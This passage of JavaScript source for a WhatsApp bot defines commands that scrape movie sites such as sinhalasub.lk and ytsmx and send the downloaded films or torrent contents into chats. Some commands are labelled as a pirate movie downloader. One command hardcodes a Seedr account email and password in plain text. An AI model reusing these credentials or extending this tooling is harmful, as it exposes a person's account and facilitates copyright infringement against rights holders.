const msg = `*_☘ Title: ${data.data.data.mainDetails.title}_*

- *EpisodeTitle:* ${data.data.data.mainDetails.episodeTitle}
- *Year:* ${data.data.data.mainDetails.date}
- *Completeness* ${data.data.data.mainDetails.completeness}

*⛏️ Link:* ${q}

${config.FOOTER}`
		
return await conn.sendMessage(from, { image: { url:data.data.data.mainDetails.imageUrl } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
}	
} catch (e) {
reply('*_First activate location sender_*\n\n- Eg:- .activate\n- Then reply 1.1')
            console.log(e)
            }
    })       



cmd({
    pattern: "cinei",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
    async (conn, mek, m, { reply, isDev, from, q, prefix }) => {
        try {
        
        if (!q) return await reply('*Please Give Me Link..! 🖊️*')
		
if (q.includes("https://cinesubz.co/movies")) {
		
const data = await fetchJson(`${config.API}/api/cinesubz/movie?url=${q}&apikey=${config.APIKEY}`)
		
const msg = config.FOOTER

reply('UPLOADING MOVIE IMAGES 🔄')

await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[0] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[1] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[2] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[4] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[5] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 


}if (q.includes("https://cinesubz.co/tvshows")) {


const data = await fetchJson(`${config.API}/api/sinhalasubs/episodes?url=${q}&apikey=${config.APIKEY}`)
		
const msg = config.FOOTER

reply('UPLOADING MOVIE IMAGES 🔄')
	
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[0] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[1] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[2] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[4] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[5] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 	
}
} catch (e) {
reply('*_First activate location sender_*\n\n- Eg:- .activate\n- Then reply 1.1')
            console.log(e)
            }
    })       



cmd({
    pattern: `cinedl`,
    react: "📥",
    dontAddCommandList: true,
    filename: __filename
}, async (conn, mek, m, { from, q, isDev, reply }) => {
	
    if (!q) {
        return await reply('*Please provide a direct URL!*');
    }


    try {
   
        
        const mediaUrl = q.split("|")[0]
        const title = q.split("|")[1]  || 'tdd_movie_dl_system'
        

reply('╭═════════════════❀\n│  UPLOADING YOUR MOVIE 📥\n│ ❀ Target : WAIT FEW MINUTES...\n│ ❀ Use commands after come the movie\n│ ❀ Device : 1/3\n╰═════════════════❀')


if (q.includes("https://pixeldrain.com")) {    
	    
/*await conn.sendMessage(from, {
        document: { url: mediaUrl },
	caption: `${title}\n\n*🎬 TDD TEAM MOVIEDL 🎬*`,
        mimetype: 'video/mp4',
        fileName: `${title}.mp4`,
        contextInfo: {
          externalAdReply: {
            title: 'ᴛᴅᴅ-ᴍᴏᴠɪᴇ-ᴅʟ',
            body: `${title}`,
            thumbnailUrl: config.LOGO,
            sourceUrl: `${mediaUrl}`,
            mediaType: 2,
            mediaUrl: `${mediaUrl}`
          }
        }
      }, { quoted: m });	
*/

    const message = {
            document: await getBuffer(mediaUrl),
	    caption: `${title}\n\n${config.FOOTER}`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };	    
        await conn.sendMessage(from, message );

} if (q.includes("https://06.cscloud12.online")) {



/*await conn.sendMessage(from, {
        document: { url: mediaUrl },
	caption: `${title}\n\n*🎬 TDD TEAM MOVIEDL 🎬*`,
        mimetype: 'video/mp4',
        fileName: `${title}.mp4`,
        contextInfo: {
          externalAdReply: {
            title: 'ᴛᴅᴅ-ᴍᴏᴠɪᴇ-ᴅʟ',
            body: `${title}`,
            thumbnailUrl: `${config.LOGO}`,
            sourceUrl: `${q}`,
            mediaType: 2,
            mediaUrl: `${q}`
          }
        }
      }, { quoted: m });	*/


	
    
        const message = {
            document: await getBuffer(mediaUrl),
	    caption: `${title}\n\n${config.FOOTER}`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };	    
        await conn.sendMessage(from, message );



} if (q.includes("https://drive.usercontent.google.com")) {


let newlink = mediaUrl.match(/id=([a-zA-Z0-9_-]+)/)[1]
const dl = `https://drive.google.com/file/d/${newlink}/view`


	
let res = await GDriveDl(dl)
		let txt = `*[ Downloading file ]*\n\n`
		txt += `*Name :* ${res.fileName}\n`
		txt += `*Size :* ${res.fileSize}\n`
		txt += `*Type :* ${res.mimetype}`	
        await reply(txt)
conn.sendMessage(from, { document: { url: res.downloadUrl }, caption: `${res.fileName}\n\n${config.FOOTER}`, fileName: res.fileName, mimetype: res.mimetype }, { quoted: mek })

/*await conn.sendMessage(from, {
        document: { url: res.downloadUrl },
	caption: `${title}\n\n*🎬 TDD TEAM MOVIEDL 🎬*`,
        mimetype: res.mimetype,
        fileName: res.fileName,
        contextInfo: {
          externalAdReply: {
            title: 'ᴛᴅᴅ-ᴍᴏᴠɪᴇ-ᴅʟ',
            body: `${title}`,
            thumbnailUrl: `${config.LOGO}`,
            sourceUrl: `${q}`,
            mediaType: 2,
            mediaUrl: `${q}`
          }
        }
      }, { quoted: m });	*/


	

}

        await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
    } catch (error) {
        console.error('Error fetching or sending', error);
        await conn.sendMessage(from, '*Error fetching or sending *', { quoted: mek });
    }
});






//===================


cmd({
    pattern: "sinhalasub",	
    react: '📑',
    category: "movie",
    desc: "pirate moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/sinhalasubs/search?q=${q}&apikey=${config.APIKEY}`)
	
if (data.data.data.data.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.data.length; i++) {
srh.push({
title: i + 1,
description: data.data.data.data[i].title,
rowId: prefix + 'subin ' + data.data.data.data[i].link
});
}
const sections = [{
title: "_[Result from sinhalasub.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {
text: ``,
footer: config.FOOTER,
title: 'Result from sinhalasub. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
	
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})


cmd({
    pattern: "subin",	
    react: '📑',
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{
if (!q) return await reply('*Please Give Me Text..! 🖊️*')



const data = await fetchJson(`${config.API}/api/sinhalasubs/movie?url=${q}&apikey=${config.APIKEY}`)
const cap1 = `*_☘ Title: ${data.data.data.mainDetails.maintitle}_*

- *Year:* ${data.data.data.mainDetails.dateCreated}
- *Rating:* ${data.data.data.mainDetails.runtime}
- *ImdbRating* ${data.data.data.moviedata.imdbRating}
- *ImdbvotesCount* ${data.data.data.moviedata.imdbvotesCount}

*⛏️ Link:* ${q}`


const data1 = await fetchJson(`${config.API}/api/sinhalasubs/tvshow?url=${q}&apikey=${config.APIKEY}`)

const responsev = await axios.get(q);  
const $c = cheerio.load(responsev.data);
    const datas = [];
    $c("ul.episodios > li").each((c, d) => {
        datas.push({
         link: $c(d).find("div.episodiotitle > a").attr("href"),    
         title1: $c(d).find("div.numerando").text(),
         episode: $c(d).find("div.episodiotitle > a").text()
        })
    })
	
const cap2 = `*_☘ Title: ${data.data.data.mainDetails.maintitle}*

- *Year:* ${data1.data.data.mainDetails.dateCreated}
- *Rating:* ${data1.data.data.mainDetails.rating.value} || ${data1.data.data.mainDetails.rating.count}
- *Generos:* ${data1.data.data.mainDetails.genres[0]} ${data1.data.data.mainDetails.genres[1]}

⛏️ *Link:* ${q}`

if (q.includes("https://sinhalasub.lk/movies")) {
	
if (data.data.data.dllinks.directDownloadLinks.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srhss = [];
	
for (var i = 0; i < data.data.data.dllinks.directDownloadLinks.length; i++) {
srhss.push({
title: i + 1,
description: data.data.data.dllinks.directDownloadLinks[i].quality + ' | ' + data.data.data.dllinks.directDownloadLinks[i].size,
rowId: prefix + `subdl ${data.data.data.dllinks.directDownloadLinks[i].link}|${data.data.data.mainDetails.maintitle}|${data.data.data.moviedata.imageUrls[0]}`
});
}
	
const sections = [
{
title: "_Select Movie_",
rows: srhss
        },	
{
	title: "*🎬 MOVIE INFO 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `subins ${q}` , description: 'Send Movie Details 📄'},

       ]
    },	
{
	title: "*🎬 MOVIE IMAGES 🎬*",
	rows: [
	    {title: "    1.2", rowId: prefix + `subini ${q}` , description: 'Send Movie IMAGES 🏞️'},

       ]
    }
]
const listMessage = {
caption: cap1,
image : { url: data.data.data.moviedata.imageUrls[0] },	
footer: config.FOOTER,
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })	

}  
	
if (q.includes("https://sinhalasub.lk/tvshows")) {
	
	
if (datas.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srhss = [];
	
for (var i = 0; i < datas.length; i++) {
srhss.push({
title: i + 1,
description: datas[i].title1 + ' | ' + datas[i].episode,
rowId: prefix + `subintv ${datas[i].link}`
});
}
	
const sections = [
{
title: "_Select Episode_",
rows: srhss
    },	
{
	title: "*🎬 MOVIE INFO 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `subins ${q}` , description: 'Send Movie Details 📄'},

       ]
    },	
{
	title: "*🎬 MOVIE IMAGES 🎬*",
	rows: [
	    {title: "    1.2", rowId: prefix + `subini ${q}` , description: 'Send Movie IMAGES 🏞️'},

       ]
    }
]


const listMessage = {
caption: cap2,	
image : { url: data1.data.data.imageUrls[0] },	
footer: config.FOOTER,
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })	
}	

} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})


cmd({
    pattern: "subins",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
    async (conn, mek, m, { reply, isDev, from, q, prefix }) => {
        try {
        
        if (!q) return await reply('*Please Give Me Link..! 🖊️*')
if (q.includes("https://sinhalasub.lk/movies")) {
		
const data = await fetchJson(`${config.API}/api/sinhalasubs/movie?url=${q}&apikey=${config.APIKEY}`)	
const msg = `*_☘ Title: ${data.data.data.mainDetails.maintitle}_*

- *Year:* ${data.data.data.mainDetails.dateCreated}
- *Rating:* ${data.data.data.mainDetails.runtime}
- *ImdbRating* ${data.data.data.moviedata.imdbRating}
- *ImdbvotesCount* ${data.data.data.moviedata.imdbvotesCount}

*⛏️ Link:* ${q}

${config.FOOTER}`
		
return await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[0] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
	
	
	
}if (q.includes("https://sinhalasub.lk/tvshows")) {



const data = await fetchJson(`${config.API}/api/sinhalasubs/tvshow?url=${q}&apikey=${config.APIKEY}`)	
const msg = `*_☘ Title: ${data.data.data.mainDetails.maintitle}*

- *Year:* ${data.data.data.mainDetails.dateCreated}
- *Rating:* ${data.data.data.mainDetails.rating.value} || ${data.data.data.mainDetails.rating.count}
- *Generos:* ${data.data.data.mainDetails.genres[0]} ${data.data.data.mainDetails.genres[1]}

*⛏️ Link:* ${q}

${config.FOOTER}`	
return await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[0] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
}	
} catch (e) {
reply('*_First activate location sender_*\n\n- Eg:- .activate\n- Then reply 1.1')
            console.log(e)
            }
    })       



cmd({
    pattern: "subini",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
    async (conn, mek, m, { reply, isDev, from, q, prefix }) => {
        try {
        
        if (!q) return await reply('*Please Give Me Link..! 🖊️*')
		
if (q.includes("https://sinhalasub.lk/movies")) {
		
const data = await fetchJson(`${config.API}/api/sinhalasubs/movie?url=${q}&apikey=${config.APIKEY}`)
		
const msg = config.FOOTER

reply('UPLOADING MOVIE IMAGES 🔄')


await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[0] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[1] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[2] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[4] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[5] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 


}if (q.includes("https://sinhalasub.lk/tvshows")) {


const data = await fetchJson(`${config.API}/api/sinhalasubs/tvshow?url=${q}&apikey=${config.APIKEY}`)
		
const msg = config.FOOTER

reply('UPLOADING MOVIE IMAGES 🔄')
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[0] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[1] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[2] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[4] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.imageUrls[5] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 	
}
} catch (e) {
reply('*_First activate location sender_*\n\n- Eg:- .activate\n- Then reply 1.1')
            console.log(e)
            }
    })       


cmd({
    pattern: "subintv",	
    react: '📑',
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/sinhalasubs/episode?url=${q}&apikey=${config.APIKEY}`)

const cap = `*_☘ Title: ${data.data.data.mainDetails.title}*

- *Year:* ${data.data.data.mainDetails.episodeTitle}
- *Completeness:* ${data.data.data.mainDetails.completeness}
- *Date:* ${data.data.data.mainDetails.date}

⛏️ *Link:* ${q}`

	
if (config.MODE === 'nonbutton') {	
if (data.data.data.dllinks.directDownloadLinks.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.dllinks.directDownloadLinks.length; i++) {
srh.push({
title: i + 1,
description: data.data.data.dllinks.directDownloadLinks[i].quality + ' | ' + data.data.data.dllinks.directDownloadLinks[i].size,
rowId: prefix + `subdl ${data.data.data.dllinks.directDownloadLinks[i].link}|${data.data.data.mainDetails.title}|${data.data.data.imageUrls[0]}`
});
}
const sections = [{
title: "_[Result from sinhalasub.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {
caption: cap,
image : { url: data.data.data.imageUrls[0] },	
footer: config.FOOTER,
title: 'Result from sinhalasub. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })

} if (config.MODE === 'button') {



if (data.data.data.dllinks.directDownloadLinks.length < 1) return await conn.sendMessage(from, { text: N_FOUND }, { quoted: mek } )

var sections = []
        for (var i = 0; i < data.data.data.dllinks.directDownloadLinks.length; i++) {
        //if(data[i].thumb && !data[i].views.includes('Follow')){
          sections.push({
            rows: [{
              title: i + 1,
	      description:  data.data.data.dllinks.directDownloadLinks[i].quality + ' | ' + data.data.data.dllinks.directDownloadLinks[i].size,
              id: prefix + `subdl ${data.data.data.dllinks.directDownloadLinks[i].link}|${data.data.data.mainDetails.title}|${data.data.data.imageUrls[0]}`
            }]
          })
      }
//}

                let buttons = [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: 'Join Our Channel',
                        url: `https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z`,
                        merchant_url: `https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z`
                    }),
                },
                {
                    name: 'single_select',
                    buttonParamsJson: JSON.stringify({
                        title: 'Result from cinesubz. 📲',
                        sections
                    })
                }]
    
        let message = {
            image : data.data.data.imageUrls[0],	
            header: '',
            footer: config.FOOTER,
            body: cap
        }
return await conn.sendButtonMessage(from, buttons, m, message, { quoted: mek});
}
	

	
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})




cmd({
    pattern: `subdl`,
    react: "📥",
    dontAddCommandList: true,
    filename: __filename
}, async (conn, mek, m, { from, q, isDev, reply }) => {
	
    if (!q) {
        return await reply('*Please provide a direct URL!*');
    }


    try {
   
        
        const mediaUrl = q.split("|")[0]
        const title = q.split("|")[1]  || 'tdd_movie_dl_system'
        const image = q.split("|")[2] 
	    
const data = await fetchJson(`${config.API}/api/sinhalasubs/download?url=${mediaUrl}&apikey=${config.APIKEY}`)
	const dl = `${data.data.data.link}`

reply('╭═════════════════❀\n│  UPLOADING YOUR MOVIE 📥\n│ ❀ Target : WAIT FEW MINUTES...\n│ ❀ Use commands after come the movie\n│ ❀ Device : 1/3\n╰═════════════════❀')

	    
/*await conn.sendMessage(from, {
        document: { url: dl },
	caption: `${title}\n\n*🎬 TDD TEAM MOVIEDL 🎬*`,
        mimetype: 'video/mp4',
        fileName: `${title}.mp4`,
        contextInfo: {
          externalAdReply: {
            title: 'ᴛᴅᴅ-ᴍᴏᴠɪᴇ-ᴅʟ',
            body: `${title}`,
            thumbnailUrl: `${image}`,
            sourceUrl: `${q}`,
            mediaType: 2,
            mediaUrl: `${image}`
          }
        }
      }, { quoted: m });	*/

	    
const message = {
            document: await getBuffer(dl),
	    caption: `${title}\n\n${config.FOOTER}`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };	    
        await conn.sendMessage(from, message );
	    
        await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
    } catch (error) {
        console.error('Error fetching or sending', error);
        await conn.sendMessage(from, '*Error fetching or sending *', { quoted: mek });
    }
});




//====================






cmd({
    pattern: "ytsmx",	
    react: '📑',
    category: "movie",
    desc: "ytsmx moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/ytsmx/search?q=${q}&apikey=${config.APIKEY}`)

if (data.data.data.data.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.data.length; i++) {
srh.push({
title: i + 1,
description: `${data.data.data.data[i].title} | ${data.data.data.data[i].rating} | ${data.data.data.data[i].year}`,
rowId: prefix + 'ytmx ' + data.data.data.data[i].link
});
}
const sections = [{
title: "_[Result from ytsmx.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {
text: ``,
footer: config.FOOTER,
title: 'Result from ytsmx. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})


cmd({
    pattern: "ytmx",	
    react: '📑',
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/ytsmx/movie?url=${q}&apikey=${config.APIKEY}`)
const cap = `*_☘ Title: ${data.data.data.moviedata.title}*

- *Year:* ${data.data.data.moviedata.year}
- *Language:* ${data.data.data.moviedata.language}
- *Enter:* ${data.data.data.moviedata.enter}

⛏️ *Link:* ${q}`

if (data.data.data.moviedata.dllinks.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.moviedata.dllinks.length; i++) {
srh.push({
title: i + 1,
description: `${data.data.data.moviedata.dllinks[i].quality} | ${data.data.data.moviedata.dllinks[i].type} | ${data.data.data.moviedata.dllinks[i].size}`,
rowId: prefix + 'ytsmxdl ' + data.data.data.moviedata.dllinks[i].magnet
});
}
const sections = [{
title: "_[Result from ytsmx.]_",
rows: srh
    },	
{
	title: "*🎬 MOVIE DETAILS 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `ytsmxs ${q}` , description: 'Send Movie IMAGES 🏞️'},

       ]
    }
]
    const listMessage = {
caption: cap,	
image: data.data.data.moviedata.image,
footer: config.FOOTER,
title: 'Result from ytsmx. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})

cmd({
    pattern: "ytsmxs",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
    async (conn, mek, m, { reply, isDev, from, q, prefix }) => {
        try {
        
        if (!q) return await reply('*Please Give Me Link..! 🖊️*')

		
const data = await fetchJson(`${config.API}/api/ytsmx/movie?url=${q}&apikey=${config.APIKEY}`)
const msg = `*_☘ Title: ${data.data.data.moviedata.title}*

- *Year:* ${data.data.data.moviedata.year}
- *Language:* ${data.data.data.moviedata.language}
- *Enter:* ${data.data.data.moviedata.enter}

*⛏️ Link:* ${q}

${config.FOOTER}`
		
return await conn.sendMessage(from, { image: { url:data.data.data.moviedata.image } , caption: msg } , { quoted: mek })

await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*_First activate location sender_*\n\n- Eg:- .activate\n- Then reply 1.1')
            console.log(e)
            }
    })       






cmd({
    pattern: "ytsmxdl",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
async(conn, mek, m,{from, l, prefix, quoted, body, isDev, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
	

							 
//  if ( !isDev ) return reply('⚠️ ⚠️ *Contact owner to Active your number To Premium user*')  

var Seedr = require("seedr");
var seedr = new Seedr();
await seedr.login("vajirarathnayaka891@gmail.com","vajirarathnayaka891@");

const ad_mg = await conn.sendMessage(from, { text : 'ᴜᴘʟᴏᴀᴅɪɴɢ magnet file...📥' }, {quoted: mek} )
const magnet = await seedr.addMagnet(q);

reply('╭═════════════════❀\n│  UPLODING YOUR MOVIE 📥\n│ ❀ Target : WAIT FEW MINUTES...\n│ ❀ Use commands after come the movie\n│ ❀ Device : 1/3\n╰═════════════════❀')


    if (magnet.code === 400 || magnet.result !== true) {
        console.log("Error adding magnet " + JSON.stringify(magnet, null, 2))
        return null;
    }
    var contents = []
	do {
		contents = await seedr.getVideos();
	} while (contents.length === 0);


		var file = await seedr.getFile(contents[0][0].id);
		var folder_id=  contents[0][0].fid 

	const link = file.url

	    
/*await conn.sendMessage(from, {
        document: await getBuffer(link),
        mimetype: 'audio/mp4',
        fileName: `${file.name}.mp4`,
        contextInfo: {
          externalAdReply: {
            title: 'ᴛᴅᴅ-ᴍᴏᴠɪᴇ-ᴅʟ',
            body: `${file.name}`,
            thumbnailUrl: `${config.LOGO}`,
            sourceUrl: `${q}`,
            mediaType: 2,
            mediaUrl: `${config.LOGO}`
          }
        }
      }, { quoted: m });	*/


const message = {
            document: await getBuffer(link),
	    caption: `${file.name}\n\n${config.FOOTER}`,
            mimetype: "video/mp4",
            fileName: `${file.name}.mp4`,
        };	    
        await conn.sendMessage(from, message );

	await seedr.deleteFolder(folder_id)
await conn.sendMessage(from, { text : `Movie send ${config.JID} Successfull ✔` }, {quoted: mek} )
	
} catch (e) {
await conn.sendMessage(from, { react: { text: '❌', key: mek.key } })
console.log(e)
reply(`❌ *Error Accurated !!*\n\n${e}`)
}
})



//===============ZOOM================
cmd({
    pattern: "zoom",	
    react: '📑',
    category: "movie",
    desc: "zoom moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
const url = `https://zoom.lk/?s=${q}`;
const response = await axios.get(url);	
const $ = cheerio.load(response.data);

let results = [];
    $("div.td-pb-span8.td-main-content > div > div.td_module_16.td_module_wrap.td-animation-stack").each((c, d) => {
        results.push({
             time: $(d).find("div.item-details > div > span > time").text(),
             title: $(d).find("div.item-details > h3 > a").text(),
             author: $(d).find("div.item-details > div > span > a").text(),
             desc: $(d).find("div.item-details > div.td-excerpt").text(),
             comments: $(d).find("div.item-details > div > span.td-module-comments a").text(),
             image: $(d).find("div.td-module-thumb > img").attr("src"),
	     link: $(d).find("div.item-details > h3 > a").attr("href"),	
           
        })
    })


if (results.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < results.length; i++) {
srh.push({
title: i + 1,
description: results[i].title + '+' + results[i].time,
rowId: prefix + 'zoomdl ' + results[i].link
});
}
const sections = [{
title: "_[Result from zoom.]_",
rows: srh
}]

    const listMessage = {
caption: `🎬 VAJIRA MD MOVIE-DL 🎬

   ⏳ Search A Movie Name: ${q}
📲 Search top 10 Movies\n`,
image : { url: config.LOGO },		    
footer: 'MOVIE DOWNLOADER BY VAJIRA MD',
title: 'Result from zoom. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})



cmd({
    pattern: "zoomdl",	
    react: '📑',
    category: "",
    desc: "pirate moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')


const response = await axios.get(q);	
const $ = cheerio.load(response.data);
      const title = $("#tdi_56 > div > div.vc_column.tdi_59.wpb_column.vc_column_container.tdc-column.td-pb-span8 > div > div.td_block_wrap.tdb_title.tdi_60.tdb-single-title.td-pb-border-top.td_block_template_17 > div > h1").text();
      const author = $("#tdi_56 > div > div.vc_column.tdi_59.wpb_column.vc_column_container.tdc-column.td-pb-span8 > div > div.vc_row_inner.tdi_62.vc_row.vc_inner.wpb_row.td-pb-row > div.vc_column_inner.tdi_64.wpb_column.vc_column_container.tdc-inner-column.td-pb-span4 > div > div > div > div > ul > li > a").text();
      const view = $("#tdi_56 > div > div.vc_column.tdi_59.wpb_column.vc_column_container.tdc-column.td-pb-span8 > div > div.vc_row_inner.tdi_62.vc_row.vc_inner.wpb_row.td-pb-row > div.vc_column_inner.tdi_67.wpb_column.vc_column_container.tdc-inner-column.td-pb-span4 > div > div > div > div > span").text();
      const date = $("#tdi_56 > div > div.vc_column.tdi_59.wpb_column.vc_column_container.tdc-column.td-pb-span8 > div > div.vc_row_inner.tdi_62.vc_row.vc_inner.wpb_row.td-pb-row > div.vc_column_inner.tdi_70.wpb_column.vc_column_container.tdc-inner-column.td-pb-span4 > div > div > div > div > time").text();
      const size = $("#tdi_81 > div > div.vc_column.tdi_84.wpb_column.vc_column_container.tdc-column.td-pb-span8 > div > div.td_block_wrap.tdb_single_content.tdi_86.td-pb-border-top.td_block_template_17.td-post-content.tagdiv-type > div > p > a > small").text();
      const dllink = $("div.tdb-block-inner.td-fix-index > p > a").attr("href");

const cap = `📃 *Title:* ${title}\n
🔗 *Link:* ${dllink}\n
📅 *Year:* ${date}\n
💫 *Size:* ${size}\n
⏳ *Views:* ${view}\n`
	
	    
  const sections = [
{
	title: "*🎬 SUB-SEARCH-SITE 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `zip ${dllink}|${title}` , description: `Download in ${size}`},	
	]
    }	  
]
const listMessage = {
text: cap,
footer: 'MOVIE DOWNLOADER BY VAJIRA MD',
title: 'Search By zoom',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})


//================SUBZ===============

cmd({
    pattern: "subz",	
    react: '📑',
    category: "movie",
    desc: "subz moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	var link = `https://subz.lk/?s=${q}`
var response = await axios.get(link);
var $ = cheerio.load(response.data);
const results = [];

$('div.col-lg-3.col-md-6.col-sm-12').each((i,element) => {
results.push({
title: $(element).find('a.font-bold.text-wrap.text-break.text-justify').text(),
link: $(element).find('a').attr("href"),
image: $(element).find('img').attr("src"),
emovies: $(element).find('a.text-white').attr("href"),
})
    })

	
if (results.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < results.length; i++) {
srh.push({
title: i + 1,
description: results[i].title  + '+' + results[i].emovies,
rowId: prefix + 'subzdl ' + results[i].link
});
}
const sections = [{
